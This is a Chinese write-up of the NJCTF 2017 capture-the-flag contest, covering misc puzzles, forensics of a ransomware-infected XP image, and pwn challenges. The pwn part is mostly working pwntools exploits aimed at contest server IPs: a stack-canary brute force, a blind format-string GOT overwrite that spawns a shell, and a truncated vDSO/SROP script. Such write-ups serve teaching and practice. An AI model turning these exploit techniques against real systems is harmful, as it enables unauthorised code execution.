# 【CTF攻略】XCTF南京站：NJCTF 2017 Writeup（通关攻略）
|
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
作者：[Veneno@Nu1L](http://bobao.360.cn/member/contribute?uid=1490911994)
预估稿费：500RMB
投稿方式：发送邮件至[linwei#360.cn](mailto:PI:EMAIL)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿
PS：十分感谢清华的大佬们的高质量题目(第一次写web题这么多的比赛wp，感谢大佬照顾web狗
**MIsc**
* * *
**check QQ**
QQ群看下：
**Shooter**
jpg末尾发现有png文件的IDAT块，提取出来缺少png文件头前四字节，补全打开得到一个二维码，扫描后得到
key:"boomboom"!!!
然后拿着"boomboom"!!!试了一大把隐写工具，最后outguess 成功解密。得到 flag。
**easy_crypto**
直接贴脚本：
**Ransom**
题目提供了一个xp虚拟机的硬盘和内存文件，由于题目没有更多的信息，所以我们首先尝试开启这一虚拟机。一路顺风我们启动了它，看到了桌面上醒目的flag和勒索软件提示页面，大概也猜到了是要干什么了。
观察vmem、vmdk修改时间可知二者并不处于同一状态，大概出题人酱又去偷偷干了什么不可描述的事吧。
于是利用开源内存取证神器Volatility，观察进程树pstree得知WinRAR调用了记事本和rundll32。
考虑到有窗口信息，于是使用screenshot插件+editbox插件，得知记事本的内容：
窗口的分布：
想着要从内存里把这些文件揪粗来，然而并无任何头绪。于是继续探索，想到可能会有勒索软件的dll注入到进程中，于是将winrar、notepad、rundll32的内存dump出来，顺便也看到了命令行，得知winrar调用图片查看器、记事本来打开文件。脑洞奇大的窝顿时脑补出带着payload的畸形图片无情的欺凌着我们可爱的xp娘blablabla…..
在经过了一两个小时的混沌后，反射弧奇长的我终于还是反应过来这是一道杂项题而不是re题。目标只有一个，就是拿到压缩包里面的内容。文件可能藏在内存里，也可能是出题人删除了。于是兵分两路，利用openfiles插件dump出文件列表，发现并没有什么东西；另一边挂载vmdk虚拟硬盘，利用DiskGenius恢复文件，得到了.key.zip、private.jpg、public.jpg
一般的ransomware都是把文件用诸如AES、RC4等对称加密算法加密后再把密钥用RSA加密一次，因为RSA实在是太慢了。如此明确的文件名提示可以看出来有三个aes
key，猜测是分别对应了三个flag文件，也印证了刚才的猜想（ ˘•ω• ˘）
于是开始利用private.jpg内存储的HexString尝试解密，发现和一般的RSA并不相同，以为里面存储了d。可是想到public.jpg也是这样的格式，总不可能一个存n一个存d吧。天然呆的窝终于还是想起来了开头的记事本下面有两行out1=private.jpg
out2=public.jpg。猜测这两个文件又被加密了，于是开始猜测算法。密钥看着很像Base64，原长度为32，decode后长度会变为24，这两种密钥长度对应常见的算法是AES、3DES、Blowfish。于是利用飘云阁的密码学综合工具尝试解密，发现AES解出第一个block中出现少量明文字串。
猜测是由于CBC与ECB模式的原因，于是利用一个在线的AES加解密网站http://aes.online-domain-tools.com/，成功解出private.jpg，但是由于iv未知，导致第一个block的内容丢失。不过好在丢的是“—–BEGIN RSA
PRIVATE KEY—–”，不影响使用。
利用这个私钥再去解密三个aes key，
解密后如下：
    aes key1:YzRhbjBxli9aHy3oHrEtjOiGBLaXUO9U
    aes key2:7MBUeEeh3XFMY6tK4OOPonFiKkFRZWWF
    aes key3:501v0w08v4qYs3VBg32Kl6ccoT5PZmLx
再用aes key解出三个flag文件的内容，发现有大量乱码，但是末尾出有部分 flag出现。
通过观察猜测flag均从逗号开始，拼接三部分得到最终flag：
    NJCTF{L3t_Vs_G0ooo0000_g000000_9o}
啦啦我是一血OvO
**knock**
字频统计：
根据knock将text中的密文分割（下划线代表分隔符）在quipqiup破解换字式密文后得到一段栅栏密码，解密得到flag
**Traffic**
此题有两个关键点。1寻找到正确的藏flag的数据。2 找到合适的算法恢复数据。
Wireshark打开pcap包，各种看，做了非常多的无用功。无意间看到PRIVMSG。使用2进制工具搜索
然后使用strings xx.pcap|grep Lord_BIG@> a.txt，得到包含一堆像base64串的数据。
写脚本解开所有base64串发现是一篇文章。
队友使用wireshark搜索提取的字符串，发现跟我提取的结果不一致。
一个文件243个base64串，一个文件240个base串。
Strings简单粗暴，无法过滤重复包之类的。暂时使用队友提供的数据进行分析。
然后卡了很久。不知道下一步干啥。
过了很久队友找到了这个。感觉跟题目很类似。
使用题目数据进行验证。
下一步找数据隐藏算法。写脚本恢复数据。出题人使用包含=的字符串进行数据隐藏。
将所有base64串 先decode，再encode。找出有差异的字符。
发现差值为1，2，3。猜测隐藏了2bit数据。
将所有包含=的字符串参与数据提取运算。得到的数值为0，1，2，3.将所有数据拼接在一起即可解出数据。
组合数据时候，使用穷举的方法。常识了想到的所有可能。2字节数据大小端序，数据块大小端序等。。。
最后得到
**PWN**
* * *
**Pwn 150 – messager**
Fork server逐字节爆破canary。
脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    from ctypes import *
    import os, sys
    io = None
    # switches
    DEBUG = 0
    LOCAL = 0
    VERBOSE = 1
    # modify this
    def makeio():
        global io
        if LOCAL:
            io = remote('localhost', 5555)
        else:
            io = remote('218.2.197.234',2090)
        return io
    if VERBOSE: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
        return io.recvuntil(delim)
    def rn(count):
        return io.recvn(count)
    def ra(count):      # recv all
        buf = ''
        while count:
            tmp = io.recvn(count)
            buf += tmp
            count -= len(tmp)
        return buf
    def sl(data):
        return io.sendline(data)
    def sn(data):
        return io.send(data)
    def info(string):
        return log.info(string)
    def dehex(s):
        return s.replace(' ','').decode('hex')
    def limu8(x):
        return c_uint8(x).value
    def limu16(x):
        return c_uint16(x).value
    def limu32(x):
        return c_uint32(x).value
    # define interactive functions here
    def send(x):
        ru('Welcome!n')
        sn(x)
        return
    # define exploit function here
    def pwn():
        canary = 'x00'
        while len(canary) != 8:
            for i in xrange(256):
                b = chr(i)
                payload = 104*'A' + canary + b
                io = makeio()
                try:
                    print 'sending...', i
                    send(payload)
                    line = ru('n')
                    if 'Message' in line:
                        io.close()
                        canary += b
                        break
                except Exception, e:
                    print e
                    io.close()
                    continue
        info("canary = " + hex(u64(canary)))
        io = makeio()
        payload = 104*'A' + canary + p64(0x12345678) + p64(0x400BC6)
        send(payload)
        io.interactive()
        return
    if __name__ == '__main__':
        pwn()
    Pwn 300 - pingme
    Blind Fsb， 先把binary dump下来，然后直接改printf got表。
    脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    from ctypes import *
    import os, sys
    io = None
    # switches
    DEBUG = 0
    LOCAL = 0
    VERBOSE = 1
    # modify this
    def makeio():
        global io
        if LOCAL:
            io = process('xxx')
        else:
            io = remote('218.2.197.235',23745)
        ru('men')
        return io
    if VERBOSE: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
        return io.recvuntil(delim)
    def rn(count):
        return io.recvn(count)
    def ra(count):      # recv all
        buf = ''
        while count:
            tmp = io.recvn(count)
            buf += tmp
            count -= len(tmp)
        return buf
    def sl(data):
        return io.sendline(data)
    def sn(data):
        return io.send(data)
    def info(string):
        return log.info(string)
    def dehex(s):
        return s.replace(' ','').decode('hex')
    def limu8(x):
        return c_uint8(x).value
    def limu16(x):
        return c_uint16(x).value
    def limu32(x):
        return c_uint32(x).value
    # define interactive functions here
    # 8 -> 9
    # 12 -> 10
    def leak(address):
        if 'n' in p32(address) or 'x00' in p32(address):    return 'x00'
        tem = '~~%9$s~~' + p32(address)
        sl(tem)
        ru('~~')
        data = ru('~~')[:-2]
        return data + 'x00'
    # define exploit function here
    def pwn():
        global io
        if DEBUG: gdb.attach(io)
        io = makeio()
        '''
        f = open('dump.bin', 'wb')
        address = 0x8048000
        while 1:
            try:
                io = makeio()
                while 1:
                    data = leak(address)
                    f.write(data)
                    address += len(data)
            except Exception, ex:
                io.close()
        f.flush()
        f.close()
        '''
        sl('s')
        ru('s')
        addr = u32(leak(0x8049974)[:4])
        info("leak = " + hex(addr))
        libc = addr - 0x49020
        system = libc + 0x3a940
        info("system = " + hex(system))
        s = p32(system)
        fmtstr = ''
        start = 0
        for i in xrange(len(s)-1):
            if ord(s[i]) >= start:
                pad = ord(s[i]) - start
            else:
                pad = ord(s[i]) - start + 256
            fmtstr += '%' + '{}'.format(pad) + 'c' + '%' + '{}'.format(16+i) + '$hhn'
            start = ord(s[i])
        print len(fmtstr)
        fmtstr = fmtstr.ljust(36, 'A')
        fmtstr += p32(0x8049974)
        fmtstr += p32(0x8049975)
        fmtstr += p32(0x8049976)
        sl(fmtstr)
        sl('/bin/sh;')
        io.interactive()
        return
    if __name__ == '__main__':
        pwn()
    Pwn 300 - 233
    爆破vDSO地址+SROP
    脚本：
    #!/usr/bin/env python2
    # -*- coding:utf-8 -*-    from pwn import *
    from ctypes import *
    import os, sys
    import random
    import time
    # switches
    DEBUG = 1
    LOCAL = 0
    VERBOSE = 1
    io = None
    context(arch='i386')
    # modify this
    def makeio():
        global io
        if LOCAL:
            io = process('233')
        else:
            io = remote('106.14.22.20', 23743)
        return io
    if VERBOSE: context(log_level='debug')
    # define symbols and offsets here
    # simplified r/s function
    def ru(delim):
        return io.recvuntil(delim, timeout=4)
    def rn(count):
        return io.recvn(count)
    def ra(count):      # recv all